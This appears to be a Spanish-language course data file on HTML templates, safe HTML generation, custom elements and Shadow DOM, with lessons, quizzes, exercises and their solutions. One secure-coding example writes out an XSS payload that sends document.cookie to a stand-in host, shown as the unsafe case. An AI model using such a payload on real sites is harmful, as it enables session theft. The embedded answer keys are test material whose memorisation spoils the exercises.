window.CURSOS = window.CURSOS || {};
(CURSOS.html = CURSOS.html || []).push({
titulo: "Plantillas y Web Components",
resumen: "template y generación segura de HTML, custom elements y su ciclo de vida, Shadow DOM, slots y shadow DOM declarativo",
nivel: "Experto",
color: "#d25e3a",
lecciones: [

/* =============== U8 L1 =============== */
{
id:"ht8n1",
titulo:"template y generar HTML sin abrir agujeros",
claves:["template guarda HTML inerte: no se pinta, no carga imágenes ni ejecuta scripts hasta clonarlo","textContent inserta texto; innerHTML con datos del usuario es la puerta del XSS","Si hay que construir HTML como texto, escapa &amp; &lt; &gt; \" y '"],
pasos:[
 {t:"info", eti:"Moldes", h:"El elemento template",
  c:`<div class="termbox">&lt;template id="tpl-tarea"&gt;
  &lt;li class="tarea"&gt;
    &lt;label&gt;&lt;input type="checkbox"&gt; &lt;span class="texto"&gt;&lt;/span&gt;&lt;/label&gt;
    &lt;button type="button" class="borrar"&gt;Borrar&lt;/button&gt;
  &lt;/li&gt;
&lt;/template&gt;

&lt;script type="module"&gt;
  const tpl = document.getElementById("tpl-tarea");
  function pintar(tarea) {
    const nodo = tpl.content.cloneNode(true);             // copia profunda del fragmento
    nodo.querySelector(".texto").textContent = tarea.texto;  // texto, nunca HTML
    document.querySelector("#lista").append(nodo);
  }
&lt;/script&gt;</div>
     <p>El contenido de <code>&lt;template&gt;</code> se analiza pero queda <b>inerte</b> en <code>tpl.content</code> (un DocumentFragment): no se muestra, sus imágenes no se descargan y sus scripts no se ejecutan hasta que lo clonas e insertas. Es la base de muchas librerías y de los Web Components.</p>`},
 {t:"info", eti:"Seguridad", h:"innerHTML frente a textContent",
  c:`<div class="termbox">const nombre = '&lt;img src=x onerror="fetch(\\'https://malo.ejemplo/?c=\\'+document.cookie)"&gt;';

saludo.innerHTML = "Hola, " + nombre;     // MAL: se crea la img y se ejecuta el onerror (XSS)
saludo.textContent = "Hola, " + nombre;   // BIEN: se muestra el texto tal cual</div>
     <ul><li><b>textContent</b> (o <code>createElement</code> + <code>append</code>) para cualquier dato que venga de fuera.</li>
     <li>Si de verdad necesitas insertar HTML ajeno (un comentario con formato), pásalo por un sanitizador (DOMPurify; los navegadores están incorporando la API Sanitizer con <code>setHTML()</code>) y, en producción, protege con <b>CSP</b> y <b>Trusted Types</b>.</li>
     <li>Si generas HTML como texto (en el servidor, en una plantilla), escapa siempre: <code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code>. El <code>&amp;</code> primero, o escaparías dos veces.</li></ul>`},
 {t:"codigo", p:"Escribe <code>escaparHTML</code>: por cada línea de la entrada, imprime su versión segura para meterla en HTML (texto y atributos entre comillas)",
  lenguaje:"js",
  c:`<p>Sustituye <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code> y <code>'</code> por <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;quot;</code> y <code>&amp;#39;</code>.</p>`,
  plantilla:"function escaparHTML(s) {\n  // devuelve s escapado\n}\nconst lineas = require(\"node:fs\").readFileSync(0, \"utf8\").split(\"\\n\").filter(l => l !== \"\");\nfor (const l of lineas) console.log(escaparHTML(l));\n",
  pruebas:[
   {entrada:"<b>Hola</b>\n", salida:"&lt;b&gt;Hola&lt;/b&gt;"},
   {entrada:"Tom & Jerry dicen \"hola\"\n", salida:"Tom &amp; Jerry dicen &quot;hola&quot;"},
   {entrada:"<img src=x onerror='alert(1)'>\n&lt; ya escapado\n", salida:"&lt;img src=x onerror=&#39;alert(1)&#39;&gt;\n&amp;lt; ya escapado", oculta:true}],
  pista:"Encadena replace con expresiones regulares globales, empezando por /&amp;/g.",
  solucion:"function escaparHTML(s) {\n  return s.replace(/&/g, \"&amp;\").replace(/</g, \"&lt;\").replace(/>/g, \"&gt;\").replace(/\"/g, \"&quot;\").replace(/'/g, \"&#39;\");\n}\nconst lineas = require(\"node:fs\").readFileSync(0, \"utf8\").split(\"\\n\").filter(l => l !== \"\");\nfor (const l of lineas) console.log(escaparHTML(l));",
  why:"El caso oculto muestra por qué &amp; va primero: el texto «&amp;lt;» escrito por el usuario debe verse tal cual, así que su &amp; también se escapa. Los motores de plantillas (JSX, Thymeleaf, Jinja) hacen esto por defecto: no lo desactives."},
 {t:"opcion", p:"Tienes que mostrar el nombre que el usuario escribió en su perfil. ¿Qué usas?",
  ops:["el.innerHTML = nombre","el.textContent = nombre","el.outerHTML = nombre","document.write(nombre)"],
  ok:1, why:"textContent nunca interpreta etiquetas: cualquier «&lt;script&gt;» se ve como texto. Es también más rápido, porque no invoca al parser de HTML."},
 {t:"vf", p:"Las imágenes que hay dentro de un <code>&lt;template&gt;</code> se descargan al cargar la página.",
  ok:false, why:"El contenido del template es inerte: se descargan cuando clonas el fragmento y lo insertas en el documento."},
 {t:"hueco", p:"Completa la clonación de la plantilla",
  tpl:'const copia = plantilla.___.cloneNode(___);\ncopia.querySelector("h3").textContent = producto.nombre;\nlista.append(copia);',
  banco:["content","true","innerHTML","false","children","html"], sol:["content","true"],
  why:"<code>content</code> es el DocumentFragment con el HTML de la plantilla; <code>cloneNode(true)</code> copia en profundidad. Con false copiarías solo el fragmento vacío."},
 {t:"orden", p:"Ordena el escapado para que no haya dobles escapes",
  items:["& → &amp;","< → &lt;","> → &gt;",'" → &quot;',"' → &#39;"],
  why:"Si escapas &lt; primero y &amp; después, el &amp;lt; recién creado se convierte en &amp;amp;lt; y en pantalla se vería «&amp;lt;» literal en vez de «&lt;»."}
]},

/* =============== U8 L2 =============== */
{
id:"ht8n2",
titulo:"Custom elements: tus propias etiquetas",
claves:["customElements.define registra una etiqueta con guion (mi-tarjeta) y una clase que extiende HTMLElement","connectedCallback, disconnectedCallback y attributeChangedCallback con observedAttributes","Mejora progresiva: el contenido debe tener sentido antes de que se defina el elemento (:defined)"],
pasos:[
 {t:"info", eti:"Componentes nativos", h:"Definir un elemento",
  c:`<div class="termbox">&lt;contador-clics inicio="3"&gt;
  &lt;button type="button"&gt;Clics: 3&lt;/button&gt;
&lt;/contador-clics&gt;

&lt;script type="module"&gt;
class ContadorClics extends HTMLElement {
  static observedAttributes = ["inicio"];

  connectedCallback() {                     // al entrar en el documento
    this.boton = this.querySelector("button");
    this.valor = Number(this.getAttribute("inicio") ?? 0);
    this.alPulsar = () =&gt; this.pintar(++this.valor);
    this.boton.addEventListener("click", this.alPulsar);
  }
  disconnectedCallback() {                  // al salir: limpia
    this.boton.removeEventListener("click", this.alPulsar);
  }
  attributeChangedCallback(nombre, antes, ahora) {
    if (this.boton) this.pintar(this.valor = Number(ahora));
  }
  pintar(n) { this.boton.textContent = "Clics: " + n; }
}
customElements.define("contador-clics", ContadorClics);
&lt;/script&gt;</div>`},
 {t:"info", eti:"Reglas", h:"Nombres, ciclo de vida y mejora progresiva",
  c:`<ul><li>El nombre <b>debe llevar un guion</b>, en minúsculas y empezar por letra: <code>mi-tarjeta</code>, <code>cat-boton</code>. Así nunca choca con una etiqueta futura de HTML.</li>
     <li>Siempre con etiqueta de cierre: <code>&lt;mi-tarjeta /&gt;</code> <b>no</b> se cierra solo; el parser lo trata como apertura.</li>
     <li>Un elemento no definido es un <code>HTMLElement</code> genérico que muestra su contenido. Con <code>:not(:defined)</code> en CSS evitas el parpadeo, y si el contenido interior ya es útil (el botón del ejemplo), la página funciona aunque falle el JavaScript.</li>
     <li>Los <b>customized built-ins</b> (<code>&lt;button is="boton-bonito"&gt;</code>) están en la norma pero Safari se niega a implementarlos: evítalos.</li>
     <li>Los atributos son texto: para datos complejos usa propiedades (<code>el.datos = {...}</code>). Y un elemento propio no tiene semántica: si es un botón, pon un <code>&lt;button&gt;</code> dentro.</li></ul>`},
 {t:"par", p:"Empareja cada callback con cuándo se ejecuta",
  pares:[["connectedCallback","Al insertarse en el documento"],["disconnectedCallback","Al quitarse del documento"],["attributeChangedCallback","Al cambiar un atributo observado"],["constructor","Al crearse la instancia, antes de tener hijos garantizados"]],
  why:"En el constructor no leas atributos ni hijos: si el elemento se crea por el parser, puede que aún no existan. El trabajo va en connectedCallback."},
 {t:"opcion", p:"¿Cuál de estos nombres es válido para un custom element?",
  ops:["tarjeta","Tarjeta-Producto","tarjeta-producto","-tarjeta"],
  ok:2, why:"Minúsculas, empieza por letra y contiene al menos un guion. Sin guion podría chocar con un elemento futuro de HTML."},
 {t:"hueco", p:"Completa el registro de un elemento que reacciona al atributo <code>estado</code>",
  tpl:'class AvisoEstado extends ___ {\n  static ___ = ["estado"];\n  attributeChangedCallback(nombre, antes, ahora) { /* … */ }\n}\ncustomElements.define("aviso-estado", AvisoEstado);',
  banco:["HTMLElement","observedAttributes","Element","attributes","HTMLDivElement","watchedAttributes"], sol:["HTMLElement","observedAttributes"],
  why:"Solo los atributos listados en observedAttributes disparan attributeChangedCallback: observar todos sería caro."},
 {t:"vf", p:"<code>&lt;mi-icono nombre=\"casa\" /&gt;</code> crea un elemento vacío y cerrado, como en JSX.",
  ok:false, why:"En HTML la barra final solo se ignora en los elementos vacíos nativos. Todo lo que venga después quedará DENTRO de mi-icono hasta encontrar su cierre."},
 {t:"opcion", p:"Tu componente añade un listener a <code>window</code> en connectedCallback y la página va cada vez más lenta al navegar. ¿Qué falta?",
  ops:["Un constructor","Quitar el listener en disconnectedCallback","observedAttributes","Llamar a define dos veces"],
  ok:1, why:"Cada vez que el elemento entra se añade otro listener que nunca se quita: fuga de memoria y trabajo duplicado."},
 {t:"escribe", p:"¿Qué pseudoclase CSS selecciona los custom elements que ya se han registrado?",
  sol:[":defined","defined"],
  pista:"«Definido».",
  why:"<code>mi-tarjeta:not(:defined) { visibility: hidden; }</code> evita ver el contenido sin estilo mientras carga el módulo, pero úsalo con cuidado: si el JS falla, no se verá nunca."}
]},

/* =============== U8 L3 =============== */
{
id:"ht8n3",
titulo:"Shadow DOM, slots y shadow DOM declarativo",
claves:["El shadow DOM encapsula marcado y estilos: el CSS de fuera no entra y el de dentro no sale","slot proyecta el contenido del usuario dentro del componente; con name, en huecos concretos","Shadow DOM declarativo (template shadowrootmode) funciona sin JavaScript y con renderizado en servidor"],
pasos:[
 {t:"info", eti:"Encapsular", h:"Un componente con shadow DOM",
  c:`<div class="termbox">class TarjetaAviso extends HTMLElement {
  constructor() {
    super();
    const raiz = this.attachShadow({ mode: "open" });
    raiz.innerHTML = \`
      &lt;style&gt;
        :host { display: block; border: 1px solid var(--borde, #ccc); padding: 1rem; }
        ::slotted(h3) { margin: 0; }
      &lt;/style&gt;
      &lt;slot name="titulo"&gt;&lt;/slot&gt;
      &lt;slot&gt;Sin contenido&lt;/slot&gt;
      &lt;button part="cerrar" type="button"&gt;Cerrar&lt;/button&gt;\`;
  }
}
customElements.define("tarjeta-aviso", TarjetaAviso);

&lt;tarjeta-aviso&gt;
  &lt;h3 slot="titulo"&gt;Mantenimiento&lt;/h3&gt;
  &lt;p&gt;El sábado de 2:00 a 4:00.&lt;/p&gt;         &lt;!-- va al slot sin nombre --&gt;
&lt;/tarjeta-aviso&gt;</div>
     <p>El <b>shadow root</b> es un árbol aparte: sus estilos no afectan a la página y los selectores de la página no entran. Sí cruzan la frontera las <b>propiedades heredadas</b> (color, font) y las <b>variables CSS</b> (<code>--borde</code>): así se personaliza un componente. Desde fuera, <code>tarjeta-aviso::part(cerrar)</code> estila lo que el componente expone con <code>part</code>.</p>`},
 {t:"info", eti:"Sin JavaScript", h:"Shadow DOM declarativo",
  c:`<div class="termbox">&lt;tarjeta-aviso&gt;
  &lt;template shadowrootmode="open"&gt;
    &lt;style&gt;:host { display: block; padding: 1rem; }&lt;/style&gt;
    &lt;slot name="titulo"&gt;&lt;/slot&gt;&lt;slot&gt;&lt;/slot&gt;
  &lt;/template&gt;
  &lt;h3 slot="titulo"&gt;Mantenimiento&lt;/h3&gt;
  &lt;p&gt;El sábado de 2:00 a 4:00.&lt;/p&gt;
&lt;/tarjeta-aviso&gt;</div>
     <p>El parser crea el shadow root directamente desde el HTML (en todos los navegadores actuales desde 2024): el componente se ve bien antes de que llegue el JavaScript y puede generarse en el servidor. Luego, si se define el elemento, se «hidrata».</p>
     <div class="nota ojo"><b class="tit">Accesibilidad y formularios</b>Las referencias por id (<code>aria-labelledby</code>, <code>label for</code>) no cruzan la frontera del shadow DOM. Y un input dentro del shadow no se envía con el form de fuera: para eso existen los <i>form-associated custom elements</i> (<code>static formAssociated = true</code> y <code>this.attachInternals().setFormValue(valor)</code>).</div>`},
 {t:"par", p:"Empareja cada selector con lo que estila",
  pares:[[":host","El propio elemento del componente, desde dentro"],["::slotted(p)","Los p del usuario proyectados en un slot"],["mi-comp::part(boton)","Una pieza expuesta con part, desde fuera"],["var(--color)","Un valor que atraviesa la frontera del shadow"]],
  why:"Estas cuatro vías son la API de estilos de un componente: todo lo demás está encapsulado."},
 {t:"hueco", p:"Completa el contenido que el usuario coloca en el hueco del título",
  tpl:'<!-- dentro del shadow -->\n<___ name="titulo"></slot>\n\n<!-- uso -->\n<mi-panel><h2 ___="titulo">Ajustes</h2></mi-panel>',
  banco:["slot","slot","part","name","template","id"], sol:["slot","slot"],
  why:"En el shadow, <code>&lt;slot name&gt;</code> define el hueco; en el uso, el atributo <code>slot</code> dice a qué hueco va cada hijo. Los hijos sin slot van al slot sin nombre."},
 {t:"opcion", p:"Escribes <code>tarjeta-aviso button { color: red; }</code> en el CSS de la página y el botón interno no cambia. ¿Por qué?",
  ops:["Falta !important","El botón está en el shadow DOM y los selectores de fuera no entran; hay que usar ::part o variables CSS","El selector está mal escrito","Los custom elements no admiten CSS"],
  ok:1, why:"Es justo la encapsulación que se busca. El autor del componente decide qué se puede personalizar."},
 {t:"vf", p:"Las variables CSS (custom properties) definidas en la página llegan dentro del shadow DOM.",
  ok:true, why:"Se heredan como cualquier propiedad heredable. Es la forma estándar de tematizar componentes: el componente usa <code>var(--acento, azul)</code> y la página define <code>--acento</code>."},
 {t:"escribe", p:"¿Qué atributo de <code>&lt;template&gt;</code> crea un shadow root directamente desde el HTML? (con su valor)",
  sol:["shadowrootmode=\"open\"","shadowrootmode=open","shadowrootmode","shadowrootmode='open'","shadowrootmode=\"closed\""],
  pista:"shadow + root + mode.",
  why:"Sustituye a un antiguo atributo experimental (<code>shadowroot</code>) que solo tuvo Chrome. Es la pieza que hace viable el renderizado en servidor de Web Components."},
 {t:"opcion", p:"Tu componente con un input en su shadow DOM está dentro de un form, pero el valor no llega al servidor. ¿Qué necesitas?",
  ops:["Añadir name al componente","Convertirlo en form-associated: static formAssociated = true y attachInternals().setFormValue()","Usar mode: \"closed\"","Un slot para el input"],
  ok:1, why:"Con ElementInternals el componente participa en el formulario como un control nativo: valor, validación (setValidity) y reset."}
]}

]});
